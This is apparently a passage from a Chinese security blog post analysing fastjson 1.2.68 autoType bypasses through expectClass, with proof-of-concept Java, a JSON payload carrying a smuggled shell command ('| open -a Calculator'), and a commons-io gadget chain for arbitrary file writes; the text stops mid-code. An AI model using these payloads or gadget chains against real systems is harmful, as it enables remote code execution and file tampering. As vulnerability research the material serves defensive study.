<p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.68，官方在1.2.48对漏洞进行了修复，在MiscCodec处理Class类的地方，设置了cache为false，并且loadClass重载方法的默认的调用改为不缓存，这就避免了使用了Class提前将恶意类名缓存进去。在fastjson 1.2.68中利用expectClass绕过checkAutoType方法，实际上也是为了绕过安全检查的思路的延伸，主要使用Throwable和AutoCloseable进行绕过。</font></p>
</blockquote>
<p><font style="color:#000000;">在fastjson 1.2.68中更新了一个新的安全控制点safeMode，如果应用程序开启了safeMode，将在checkAutoType方法中直接抛出异常，也就是完全禁止autoType。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734951327786-d2fd31f4-55ba-48ce-9d5e-c2e2a033a599.png"></p>
<p><font style="color:#000000;">但与此同时，该版本出现了一个新的autoType绕过方式，利用expectClass绕过checkAutoType方法的安全检查。</font></p>
<p><font style="color:#000000;">在checkAutoType方法中有如下逻辑，</font><strong><font style="color:#000000;">如果函数有expectClass入参，且传入的类名是expectClass的子类或实现，并且不在黑名单中</font></strong><font style="color:#000000;">，就可以通过checkAutoType方法的安全检查。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">查找是否有可控的expectClass入参的方法调用checkAutoType方法，最终找到了以下几个符合的方法：</font></p>
<ol>
<li><font style="color:#000000;">ThrowableDeserializer#deserialze</font></li>
<li><font style="color:#000000;">JavaBeanDeserializer#deserialze</font></li>
</ol>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969027005-613a6571-46a6-4280-a854-58915b2a2582.png"></p>
<p><font style="color:#000000;">在ThrowableDeserializer#deserialze方法中，直接将@type后的类传入checkAutoType方法，并且expectClass为Throwable.class。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969134637-d9f7d7a1-884c-4a18-983a-aff533460cd0.png"></p>
<p><font style="color:#000000;">通过checkAutoType方法的安全检查后，使用createException方法来创建异常类的实例。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969263876-d069722f-f4ab-4330-ac02-b0b77796f5b3.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PocException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">PocException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.example.fastjson.ExecException\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;domain\&quot;: \&quot;127.0.0.1 | open -a Calculator\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">与Throwable类似地，还有AutoCloseable，之所以使用AutoCloseable以及其子类可以绕过checkAutoType方法，是因为AutoCloseable是属于fastjson内置的白名单中，其余的调用链一致。</font></p>
<h4 id="commons-io"><a href="#commons-io" class="headerlink" title="commons-io"></a>commons-io</h4><p><font style="color:#000000;">在fastjson 1.2.68版本的利用中，fastjson在判断期望类之前将继承自ClassLoader、DataSource、RowSet的类直接抛出异常，这也就导致了攻击面大大缩小，对于Gadget的挖掘，浅蓝师傅提出了使用expectClass中的AutoCloseable进行文件读写操作的思路。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">        || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">        || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">由于fastjson漏洞触发方式是通过调用get&#x2F;set构造方法来触发漏洞，因此对于写文件类的操作，根据浅蓝师傅的文章，需要满足以下几个条件：</font></p>
<ol>
<li><font style="color:#000000;">需要一个通过set方法或构造方法指定文件路径的OutputStream</font></li>
<li><font style="color:#000000;">需要一个通过set方法或构造方法传入字节数据的OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过set方法或构造方法传入一个OutputStream，最后可以通过write方法将传入的字节码write到传入的OutputStream</font></li>
<li><font style="color:#000000;">需要一个通过set方法或构造方法传入一个OutputStream，并且可以通过调用toString、hashCode、get、set、构造方法调用传入的OutputStream的close、write或flush方法</font></li>
</ol>
<h5 id="CharSequenceInputStream"><a href="#CharSequenceInputStream" class="headerlink" title="CharSequenceInputStream"></a><font style="color:#000000;">CharSequenceInputStream</font></h5><p><font style="color:#000000;">org.apache.commons.io.input.CharSequenceInputStream类是InputStream的子类，用于接收CharSequence内容并初始化，其构造方法接收参数CharSequence对象、字符编码、字节大小，并初始化放在类属性中。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CharSequenceInputStream</span><span class="params">(<span class="keyword">final</span> CharSequence cs, <span class="keyword">final</span> Charset charset, <span class="keyword">final</span> <span class="type">int</span> bufferSize)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.encoder = charset.newEncoder()</span><br><span class="line">        .onMalformedInput(CodingErrorAction.REPLACE)</span><br><span class="line">        .onUnmappableCharacter(CodingErrorAction.REPLACE);</span><br><span class="line">    <span class="comment">// Ensure that buffer is long enough to hold a complete character</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">float</span> <span class="variable">maxBytesPerChar</span> <span class="operator">=</span> encoder.maxBytesPerChar();</span><br><span class="line">    <span class="keyword">if</span> (bufferSize &lt; maxBytesPerChar) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Buffer size &quot;</span> + bufferSize + <span class="string">&quot; is less than maxBytesPerChar &quot;</span> + maxBytesPerChar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.bbuf = ByteBuffer.allocate(bufferSize);</span><br><span class="line">    <span class="built_in">this</span>.bbuf.flip();</span><br><span class="line">    <span class="built_in">this</span>.cbuf = CharBuffer.wrap(cs);</span><br><span class="line">    <span class="built_in">this</span>.mark_cbuf = NO_MARK;</span><br><span class="line">    <span class="built_in">this</span>.mark_bbuf = NO_MARK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">CharSequence是String的父接口，因此可以直接使用String对象的数据。由于这个CharSequenceInputStream类接收CharSequence对象，可以充当写入文件内容的入口类，写入的内容会放在this.cbuf中，这是一个CharBuffer对象。</font></p>
<h5 id="FileWriterWithEncoding"><a href="#FileWriterWithEncoding" class="headerlink" title="FileWriterWithEncoding"></a>FileWriterWithEncoding</h5><p><font style="color:#000000;">org.apache.commons.io.output.FileWriterWithEncoding类的构造方法接收file参数、encoding参数，创建File对象，并调用initWriter方法初始化OutputStreamWriter方法放在this.out中。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020524736-d1090dc7-9294-4473-a759-5a7b82cf9d81.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020496731-440bac7b-743c-4692-834c-aa7f9baa3095.png"></p>
<h5 id="WriterOutputStream"><a href="#WriterOutputStream" class="headerlink" title="WriterOutputStream"></a>WriterOutputStream</h5><p><font style="color:#000000;">org.apache.commons.io.output.WriterOutputStream类的构造方法接收参数Writer（writer）、字符编码（charsetName）、字节大小（bufferSize）、标识是否立即写入的布尔型参数（writeImmediately）。</font></p>
<p><font style="color:#000000;">由于CharsetDecoder是一个抽象类，也没有继承AutoCloseable接口，所以无法使用AutoType进行创建，只能使用带有charsetName的构造方法创建。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020960453-f372314f-4aa5-4895-9809-6bf62932009d.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020696891-11c76363-796b-4b25-9de9-d42604829339.png"></p>
<p><font style="color:#000000;">WriterOutputStream#write方法，会将接受到的byte数组通过this.decoderIn的put方法写入，使用this.processInput方法将in和out数据进行拷贝，并在this.flushOutput方法中调用writer的write方法写出this.decoderOut中的数据。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020803959-2574b6f3-1cbf-4405-8380-86059951e861.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020860923-f424285d-900d-4762-882a-0c9e70d7858f.png"></p>
<h5 id="TeeInputStream"><a href="#TeeInputStream" class="headerlink" title="TeeInputStream"></a>TeeInputStream</h5><p><font style="color:#000000;">现在有了接收输入（文件内容）的InputStream，负责输出的OutputStream和Writer（文件路径），接下来还需要找到将InputStream和OutputStream进行转换，以及触发写出文件操作。</font></p>
<p><font style="color:#000000;">org.apache.commons.io.input.TeeInputStream类的构造方法会接收InputStream及OutputStream，并提供将InputStream中的字节写入OutputStream的功能，以及提供调用两者close的功能。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021139457-0281377f-2dc7-4079-8d90-f64d9ef413ac.png"></p>
<p><font style="color:#000000;">TeeInputStream是FilterInputStream的子类，会在构造方法中会把InputStream放在this.in中。</font></p>
<p><font style="color:#000000;">TeeInputStream#read方法会调用其父类ProxyInputStream的read方法来读取this.in中的内容，并调用this.branch中的OutputStream对象的write方法进行写入。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021286861-8675dc87-87f7-43ff-aae3-8ebd358563c2.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021315795-b309fd92-4995-40a1-889c-09d9eb97d55b.png"></p>
<h5 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h5><p><font style="color:#000000;">org.apache.commons.io.input.BOMInputStream类会调用InputStream#read方法读取字节，其是commons-io用来检测文件输入流的BOM，并在输入流中进行过滤，根据org.apache.commons.io.ByteOrderMark中的属性，BOMInputStream支持识别以下几种BOM。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** UTF-8 BOM */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_8</span>    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-8&quot;</span>,    <span class="number">0xEF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** UTF-16BE BOM (Big-Endian) */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_16BE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-16BE&quot;</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** UTF-16LE BOM (Little-Endian) */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_16LE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-16LE&quot;</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UTF-32BE BOM (Big-Endian)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_32BE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-32BE&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UTF-32LE BOM (Little-Endian)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_32LE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-32LE&quot;</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>);</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">BOMInputStream与TeeInputStream都继承了父类ProxyInputStream，其初始化参数delegate接收InputStream，使用父类构造方法放入this.in中，boms是ByteOrderMark类的可变参数数组，用来指定不同编码的BOM头部，会处理成List对象存入this.boms中。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.io.input.BOMInputStream</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BOMInputStream</span><span class="params">(<span class="keyword">final</span> InputStream delegate, <span class="keyword">final</span> <span class="type">boolean</span> include, <span class="keyword">final</span> ByteOrderMark... boms)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(delegate);</span><br><span class="line">    <span class="keyword">if</span> (boms == <span class="literal">null</span> || boms.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No BOMs specified&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.include = include;</span><br><span class="line">    <span class="comment">// Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.</span></span><br><span class="line">    Arrays.sort(boms, ByteOrderMarkLengthComparator);</span><br><span class="line">    <span class="built_in">this</span>.boms = Arrays.asList(boms);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.io.input.ProxyInputStream</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProxyInputStream</span><span class="params">(<span class="keyword">final</span> InputStream proxy)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(proxy);</span><br><span class="line">    <span class="comment">// the proxy is stored in a protected superclass variable named &#x27;in&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.io.FilterInputStream</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">volatile</span> InputStream in;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">FilterInputStream</span><span class="params">(InputStream in)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.in = in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">ByteOrderMark就是commons-io包对流中BOM头部的封装，这个类接收charsetName和名为bytes的可变参数int数组，这个int数组用来表示不同编码的字节顺序标记的表示。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021881637-5cced3aa-3bcd-4edb-a74d-5fe27cc8bf7f.png"></p>
<p><font style="color:#000000;">BOMInputStream中存在一个getBOM方法，这个方法原本的作用就是根据类初始化时传入的InputStream对象以及ByteOrderMark配置，在流中读取对应的ByteOrderMark。这个方法创建了一个for循环，根据类初始化时的ByteOrderMark的int数组长度，调用this.in的read方法在流中循环读取相应长度的数据。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteOrderMark <span class="title function_">getBOM</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (firstBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        fbLength = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// BOMs are sorted from longest to shortest</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">maxBomSize</span> <span class="operator">=</span> boms.get(<span class="number">0</span>).length();</span><br><span class="line">        firstBytes = <span class="keyword">new</span> <span class="title class_">int</span>[maxBomSize];</span><br><span class="line">        <span class="comment">// Read first maxBomSize bytes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; firstBytes.length; i++) &#123;</span><br><span class="line">            firstBytes[i] = in.read();</span><br><span class="line">            fbLength++;</span><br><span class="line">            <span class="keyword">if</span> (firstBytes[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// match BOM in firstBytes</span></span><br><span class="line">        byteOrderMark = find();</span><br><span class="line">        <span class="keyword">if</span> (byteOrderMark != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!include) &#123;</span><br><span class="line">                <span class="keyword">if</span> (byteOrderMark.length() &lt; firstBytes.length) &#123;</span><br><span class="line">                    fbIndex = byteOrderMark.length();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fbLength = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteOrderMark;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">将上文的各步骤合到一块，大致逻辑如下：</font></p>
<ol>
<li><font style="color:#000000;">BOMInputStream初始化一个TeeInputStream和一个ByteOrderMark数组，里面存放了一个指定长度的int数组，用来读取相应长度的输入流</font></li>
<li><font style="color:#000000;">TeeInputStream初始化了一个CharSequenceInputStream和WriterOutputStream，无论调用TeeInputStream的任意一个read方法，都会将读取的内容同步调用WriterOutputStream的write方法写入其中</font></li>
<li><font style="color:#000000;">CharSequenceInputStream初始化输入的字符串（实际上是CharSequence对象）、字符编码、以及缓冲区大小（最大255）用于创建InputStream对象</font></li>
<li><font style="color:#000000;">WriterOutputStream初始化FileWriterWithEncoding以及一些属性，WriterOutputStream的write方法会将字节进行写入，如果参数writeImmediately为true，会调用OutputStreamWriter的write方法进行写出</font></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.ByteOrderMark;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.BOMInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.CharSequenceInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.TeeInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.output.FileWriterWithEncoding;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.output.WriterOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonIODemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CharSequenceInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharSequenceInputStream</span>(<span class="string">&quot;testtest&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="type">FileWriterWithEncoding</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriterWithEncoding</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/fastjson/test.txt&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">WriterOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WriterOutputStream</span>(fileWriter, <span class="string">&quot;UTF-8&quot;</span>, <span class="number">8</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">TeeInputStream</span> <span class="variable">teeInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeeInputStream</span>(inputStream, outputStream, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">ByteOrderMark</span> <span class="variable">byteOrderMark</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        <span class="type">BOMInputStream</span> <span class="variable">bomInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BOMInputStream</span>(teeInputStream, byteOrderMark);</span><br><span class="line">        bomInputStream.getBOM();</span><br><span class="line">        bomInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735022258058-5e288915-6771-4070-87be-ee07200b1473.png"></p>
<p><font style="color:#000000;">最后生成Payload的代码参考su18师傅给出的POC。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 